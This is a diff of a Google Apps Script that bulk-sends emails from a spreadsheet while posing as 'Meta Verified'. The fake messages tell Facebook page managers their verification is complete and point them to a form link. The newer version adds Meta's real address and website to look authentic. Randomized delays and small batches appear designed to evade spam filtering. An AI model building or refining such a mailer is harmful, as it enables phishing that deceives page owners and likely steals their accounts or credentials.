@@ -1,125 +1,135 @@
-const CONFIG = {
-  FORM_URL: "[LINK_FORM]", 
-  SPREADSHEET_URL: "[LINK_SHEET]", 
-  SHEET_NAME: "Sheet1",
-  SENDER_NAME: "Meta Verified",
-  BATCH_LIMIT: 4,           
-  REST_MINUTES: 5,          
-  MIN_SLEEP: 25000,         
-  MAX_SLEEP: 50000,         
-  MAX_EXECUTION_TIME: 280000,
-  QUOTA_RESERVE: 10,
-  MAX_RETRY: 2,
-  REPORT_SPREADSHEET_ID: "1zS7xVYkugJUTEcRBUVs5zdEsGuEYrfd_Bxj6PEtTKxg",
-  REPORT_SHEET_NAME: "US1",
-  LOCK_TIMEOUT: 30000
-};
-
 function shareSingleFormToList(e) {
-  const lock = LockService.getScriptLock();
-  if (!lock.tryLock(CONFIG.LOCK_TIMEOUT)) {
-    Logger.log("🔒 Một instance khác đang chạy. Bỏ qua lần này.");
-    return;
+  const CONFIG = {
+    FORM_URL: "[LINK_FORM]",
+    SPREADSHEET_URL: "[LINK_SHEET]",
+    
+    SHEET_NAME: "Sheet1",
+    SENDER_NAME: "Meta Verified",
+    PHYSICAL_ADDRESS: "1601 Willow Rd, Menlo Park, CA 94025",
+    WEBSITE: "https://www.facebook.com",
+
+    BATCH_LIMIT: 6,
+    REST_MINUTES: 5,
+    MIN_SLEEP: 30000,
+    MAX_SLEEP: 60000,
+    MAX_EXECUTION_TIME: 280000
+  };
+
+  const startTime = new Date().getTime();
+  const userEmail = Session.getActiveUser().getEmail();
+  var props = PropertiesService.getScriptProperties();
+
+  if (e === null) {
+    props.deleteProperty("LAST_SENT_ROW");
+    deleteTriggers("shareSingleFormToList");
+    Logger.log("🚀 RESET: Restarting from row 2.");
   }
 
+  // ✅ OPEN FILE USING URL (NO NEED TO OPEN FROM ACTIVE SHEET)
+  var ss;
   try {
-    _mainLogic(e);
-  } finally {
-    lock.releaseLock();
+    ss = SpreadsheetApp.openByUrl(CONFIG.SPREADSHEET_URL);
+  } catch (err) {
+    return Logger.log("❌ Unable to open Google Sheet: " + err.message);
   }
-}
 
-function _mainLogic(e) {
-  const startTime = Date.now();
-  const userEmail = getEffectiveUserEmail();
-  const props = PropertiesService.getScriptProperties();
-  
-  const quotaAtStart = MailApp.getRemainingDailyQuota();
-  Logger.log(`📊 Quota: ${quotaAtStart} | Gửi từ: ${maskEmail(userEmail)}`);
+  var sheet = ss.getSheetByName(CONFIG.SHEET_NAME);
+  if (!sheet) return Logger.log(`❌ Sheet "${CONFIG.SHEET_NAME}" not found`);
 
-  if (quotaAtStart <= CONFIG.QUOTA_RESERVE) return;
-  if (e === undefined) props.deleteProperty("LAST_SENT_ROW");
-
-  const ss = SpreadsheetApp.openById(extractSpreadsheetId(CONFIG.SPREADSHEET_URL));
-  const sheet = ss.getSheetByName(CONFIG.SHEET_NAME);
-  const startRow = Number(props.getProperty("LAST_SENT_ROW")) || 2;
-  const lastRow = sheet.getLastRow();
+  var startRow = Number(props.getProperty("LAST_SENT_ROW")) || 2;
+  var lastRow = sheet.getLastRow();
 
   if (startRow > lastRow) {
     props.deleteProperty("LAST_SENT_ROW");
+    Logger.log("🎉 Completed!");
     return;
   }
 
-  const rowsToProcess = Math.min(CONFIG.BATCH_LIMIT, lastRow - startRow + 1, quotaAtStart - CONFIG.QUOTA_RESERVE);
-  const data = sheet.getRange(startRow, 1, rowsToProcess, 7).getValues();
-  const outputStatus = [];
-  let processedCount = 0;
+  Logger.log(`📧 ${userEmail} | Row ${startRow}`);
 
-  for (let i = 0; i < data.length; i++) {
-    if (Date.now() - startTime > CONFIG.MAX_EXECUTION_TIME) break;
+  var rowsToProcess = Math.min(CONFIG.BATCH_LIMIT, lastRow - startRow + 1);
+  var dataRange = sheet.getRange(startRow, 1, rowsToProcess, 7);
+  var data = dataRange.getValues();
 
-    const email = String(data[i][0]).trim();
-    const pageName = String(data[i][1]).trim();
-    const currentStatus = String(data[i][5]).trim();
-    const existingTime = data[i][6];
+  var outputStatus = [];
+  var processedCount = 0;
+
+  for (var i = 0; i < data.length; i++) {
+    if (new Date().getTime() - startTime > CONFIG.MAX_EXECUTION_TIME) {
+      Logger.log("⏳ Execution time exceeded.");
+      break;
+    }
+
+    var email = data[i][0]?.toString().trim();
+    var pageName = data[i][1]?.toString().trim();
+    var subjectInput = data[i][2]?.toString().trim();
+    var messageTemplate = data[i][3]?.toString().trim();
+    var lineText = data[i][4]?.toString().trim();
+    var currentStatus = data[i][5];
+
+    var rowStatus = [];
 
     if (currentStatus === "✅ Sent") {
-      outputStatus.push([currentStatus, existingTime]);
-      processedCount++;
+      rowStatus = [currentStatus, data[i][6]];
+      outputStatus.push(rowStatus);
       continue;
     }
 
-    if (!isValidEmail(email) || !pageName) {
-      outputStatus.push(["🚫 Error: Missing Info", new Date()]);
-      processedCount++;
+    if (!email || !pageName || !subjectInput || !messageTemplate) {
+      rowStatus = ["⚠️ Missing required data", new Date()];
+      outputStatus.push(rowStatus);
       continue;
     }
 
-    const refId = "SRV-" + Math.floor(Math.random() * 100000) + "-" + Math.random().toString(36).substring(7).toUpperCase();
-    
-    const subjects = [
-      `Update: Service status for ${pageName} (ID: ${refId})`,
-      `Notification: Request for ${pageName} processed (Ref: ${refId})`,
-      `Account alert: Identity verification status for ${pageName}`
-    ];
-    const finalSubject = subjects[Math.floor(Math.random() * subjects.length)];
-
-    const body = 
-      "Hello Page Manager,\n\n" +
-      "This automated message is to confirm that the verification request for " + pageName + " has been completed successfully.\n\n" +
-      "Summary of status:\n" +
-      "• Page: " + pageName + "\n" +
-      "• Status: Active\n" +
-      "• Verification: Verified Badge Eligible\n" +
-      "• Reference: " + refId + "\n\n" +
-      "To view full details and next steps, please visit: " + CONFIG.FORM_URL + "\n\n" +
-      "This is a system-generated notification. Please do not reply.";
-
-    let success = false;
-    let lastError = "";
-
-    for (let attempt = 1; attempt <= CONFIG.MAX_RETRY; attempt++) {
-      try {
-        GmailApp.sendEmail(email, finalSubject, body, {
-          name: CONFIG.SENDER_NAME,
-          replyTo: userEmail
-        });
-        success = true;
-        break;
-      } catch (err) {
-        lastError = err.message;
-        Utilities.sleep(5000);
-      }
+    if (!subjectInput.includes("[Name]") || !messageTemplate.includes("[Name]")) {
+      rowStatus = ["🚫 Missing [Name] placeholder", new Date()];
+      outputStatus.push(rowStatus);
+      continue;
     }
 
-    if (success) {
-      outputStatus.push(["✅ Sent", new Date()]);
-      const sleepTime = Math.floor(Math.random() * (CONFIG.MAX_SLEEP - CONFIG.MIN_SLEEP + 1)) + CONFIG.MIN_SLEEP;
-      Logger.log(`✅ Sent to ${pageName} | Ref: ${refId} | Sleep: ${sleepTime/1000}s`);
+    try {
+      const cleanTemplate = messageTemplate.replace(/\\n/g, "\n");
+      var finalSubject = subjectInput.replace(/\[Name\]/gi, pageName);
+      var messageBody = cleanTemplate.replace(/\[Name\]/gi, pageName);
+
+      var formLine = (lineText ? lineText + "\n" : "") + CONFIG.FORM_URL;
+      var randomRef = "REF-" + Math.random().toString(36).substring(2, 8).toUpperCase();
+
+      var professionalFooter =
+`🌐 ${CONFIG.WEBSITE}
+📍 ${CONFIG.PHYSICAL_ADDRESS}
+
+Reference ID: ${randomRef} | This message was sent to ${email}.`;
+
+      var fullMessage =
+`${messageBody}
+
+${formLine}
+
+Thank you for being part of the Meta community.
+
+${professionalFooter}`;
+
+      MailApp.sendEmail({
+        to: email,
+        subject: finalSubject,
+        body: fullMessage,
+        name: CONFIG.SENDER_NAME,
+        replyTo: userEmail
+      });
+
+      rowStatus = ["✅ Sent", new Date()];
+      Logger.log(`✅ ${email} | Ref: ${randomRef}`);
+
+      var sleepTime = Math.floor(Math.random() * (CONFIG.MAX_SLEEP - CONFIG.MIN_SLEEP + 1)) + CONFIG.MIN_SLEEP;
       Utilities.sleep(sleepTime);
-    } else {
-      outputStatus.push(["❌ Error: " + lastError, new Date()]);
+
+    } catch (err) {
+      Logger.log(`❌ ${startRow + i}: ${err.message}`);
+      rowStatus = ["❌ " + err.message.substring(0, 50), new Date()];
     }
+
+    outputStatus.push(rowStatus);
     processedCount++;
   }
 
@@ -127,83 +137,35 @@ function _mainLogic(e) {
     sheet.getRange(startRow, 6, outputStatus.length, 2).setValues(outputStatus);
   }
 
-  const nextRow = startRow + processedCount;
+  var nextRow = startRow + processedCount;
+
   if (nextRow <= lastRow) {
     props.setProperty("LAST_SENT_ROW", nextRow.toString());
+
     deleteTriggers("shareSingleFormToList");
-    ScriptApp.newTrigger("shareSingleFormToList").timeBased().after(CONFIG.REST_MINUTES * 60 * 1000).create();
+
+    ScriptApp.newTrigger("shareSingleFormToList")
+      .timeBased()
+      .after(CONFIG.REST_MINUTES * 60 * 1000)
+      .create();
+
+    Logger.log(`⏳ ${processedCount} rows processed | Next: ${nextRow}`);
   } else {
     props.deleteProperty("LAST_SENT_ROW");
-    deleteTriggers("shareSingleFormToList");
-
-    const allStatus = sheet.getRange(2, 6, lastRow - 1, 1).getValues();
-    const stats = {
-      totalRows: allStatus.length,
-      totalSent: allStatus.filter(r => r[0] === "✅ Sent").length,
-      totalError: allStatus.filter(r => String(r[0]).startsWith("❌")).length,
-      totalInvalid: allStatus.filter(r => String(r[0]).startsWith("⚠️") || String(r[0]).startsWith("🚫")).length,
-      quotaRemaining: MailApp.getRemainingDailyQuota()
-    };
-    writeReport(CONFIG, stats, userEmail);
-    Logger.log(`🎉 HOÀN TẤT! Sent: ${stats.totalSent} | Errors: ${stats.totalError}`);
+    Logger.log("🎉 Fully completed!");
   }
 }
 
-function getEffectiveUserEmail() {
-  try {
-    const email = Session.getActiveUser().getEmail();
-    if (email) {
-      PropertiesService.getScriptProperties().setProperty("LAST_KNOWN_EMAIL", email);
-      return email;
+function deleteTriggers(functionName) {
+  var triggers = ScriptApp.getProjectTriggers();
+  for (var i = 0; i < triggers.length; i++) {
+    if (triggers[i].getHandlerFunction() === functionName) {
+      ScriptApp.deleteTrigger(triggers[i]);
     }
-  } catch (e) {}
-  const fallback = PropertiesService.getScriptProperties().getProperty("LAST_KNOWN_EMAIL");
-  return fallback || "valdovinoclaudia3@gmail.com";
-}
-
-function writeReport(CONFIG, stats, userEmail) {
-  try {
-    const reportSS = SpreadsheetApp.openById(CONFIG.REPORT_SPREADSHEET_ID);
-    let reportSheet = reportSS.getSheetByName(CONFIG.REPORT_SHEET_NAME);
-    if (!reportSheet) {
-      reportSheet = reportSS.insertSheet(CONFIG.REPORT_SHEET_NAME);
-      reportSheet.appendRow(["Time", "Total", "✅ Sent", "❌ Error", "⚠️ Invalid", "Quota", "Sender"]);
-    }
-    const now = Utilities.formatDate(new Date(), "GMT+7", "MM/dd/yyyy HH:mm:ss");
-    const newRow = [now, stats.totalRows, stats.totalSent, stats.totalError, stats.totalInvalid, stats.quotaRemaining, userEmail];
-    
-    const existingRow = findRowByEmail(reportSheet, userEmail);
-    if (existingRow > 0) {
-      reportSheet.getRange(existingRow, 1, 1, 7).setValues([newRow]);
-    } else {
-      reportSheet.appendRow(newRow);
-    }
-  } catch (err) {
-    Logger.log(`❌ Lỗi ghi report: ${err.message}`);
   }
 }
 
-function findRowByEmail(sheet, email) {
-  const finder = sheet.getRange("G:G").createTextFinder(email).matchEntireCell(true);
-  const found = finder.findNext();
-  return found ? found.getRow() : -1;
-}
-
-function extractSpreadsheetId(url) {
-  return url.match(/\/d\/([a-zA-Z0-9_-]+)/) ? url.match(/\/d\/([a-zA-Z0-9_-]+)/)[1] : url;
-}
-
-function isValidEmail(email) {
-  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
-}
-
-function maskEmail(email) {
-  if (!email || !email.includes("@")) return "***";
-  return email.substring(0, 3) + "***@" + email.split("@")[1];
-}
-
-function deleteTriggers(fn) {
-  ScriptApp.getProjectTriggers().forEach(t => {
-    if (t.getHandlerFunction() === fn) ScriptApp.deleteTrigger(t);
-  });
+function getFileIdFromUrl(url) {
+  const match = url.match(/\/d\/([a-zA-Z0-9_-]+)/);
+  return match ? match[1] : null;
 }
